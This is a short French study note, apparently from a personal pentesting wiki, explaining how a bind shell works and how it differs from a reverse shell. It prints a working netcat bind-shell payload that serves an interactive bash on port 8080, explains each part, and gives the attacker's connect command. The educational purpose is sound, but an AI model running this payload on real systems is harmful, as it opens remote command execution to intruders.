- Le **bind shell** ouvre un port sur la machine compromise et attend qu’un attaquant s’y connecte.
    
- Une fois connecté, l’attaquant obtient un shell et peut exécuter des commandes à distance.
    
- Utile si la victime **ne peut pas établir de connexions sortantes**, mais moins discret car le port reste ouvert → plus facilement détectable.
---
### Fonctionnement

1. **Configuration du bind shell sur la victime**  
    Exemple de payload :
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```
- rm -f /tmp/f  : supprime un ancien pipe.
    
- `mkfifo /tmp/f` : crée un **pipe nommé** pour la comm. bidirectionnelle.
    
- `cat /tmp/f` : lit les entrées.
    
- `| bash -i 2>&1` : lance un shell interactif.
    
- `| nc -l 0.0.0.0 8080` : Netcat en mode écoute sur le port 8080.
    
- `>/tmp/f` : renvoie la sortie dans le pipe pour garder la communication.
⚠️Ports < 1024 nécessitent des privilèges root → ici on utilise **8080** pour éviter ça.
2. **Connexion de l’attaquant** 
``` bash
nc -nv TARGET_IP 8080
```
**Résultat**
- L’attaquant obtient un terminal interactif
Un **bind shell** met la victime en écoute, et l’attaquant vient s’y connecter.  
C’est l’inverse du **reverse shell** : ici c’est la machine compromise qui attend, alors que dans le [[Reverse Shell]], c’est elle qui initie la connexion.ss